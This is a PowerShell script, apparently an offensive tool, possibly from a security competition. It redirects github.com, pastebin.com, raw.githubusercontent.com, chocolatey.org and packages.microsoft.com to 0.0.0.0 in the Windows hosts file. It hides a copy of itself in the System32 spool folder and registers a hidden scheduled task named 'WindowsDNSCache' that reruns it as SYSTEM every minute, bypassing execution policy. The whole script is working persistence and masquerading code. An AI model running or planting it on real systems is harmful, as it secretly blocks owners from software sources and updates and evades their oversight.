$targets = @(
    "github.com",
    "www.github.com",
    "pastebin.com",
    "www.pastebin.com",
    "raw.githubusercontent.com",
    "chocolatey.org",
    "packages.microsoft.com"
)

$hostsFile = "C:\Windows\System32\drivers\etc\hosts"
$marker = "# rit.edu"

# apply immediately
foreach ($domain in $targets) {
    $content = Get-Content $hostsFile -Raw
    if ($content -notmatch [regex]::Escape($domain)) {
        Add-Content -Path $hostsFile -Value "0.0.0.0 $domain $marker"
    }
}

# drop the rerun script to a hidden location
$scriptPath = "C:\Windows\System32\spool\dns_lock.ps1"

$scriptContent = @'
$targets = @(
    "github.com",
    "www.github.com",
    "pastebin.com",
    "www.pastebin.com",
    "raw.githubusercontent.com",
    "chocolatey.org",
    "packages.microsoft.com"
)
$hostsFile = "C:\Windows\System32\drivers\etc\hosts"
$marker = "# rit.edu"
foreach ($domain in $targets) {
    $content = Get-Content $hostsFile -Raw
    if ($content -notmatch [regex]::Escape($domain)) {
        Add-Content -Path $hostsFile -Value "0.0.0.0 $domain $marker"
    }
}
'@

$scriptContent | Out-File -FilePath $scriptPath -Encoding utf8 -Force

# register scheduled task that fires every minute as SYSTEM
$action  = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
$trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 1) -Once -At (Get-Date)
$settings = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit (New-TimeSpan -Minutes 1)
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest

Register-ScheduledTask -TaskName "WindowsDNSCache" -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force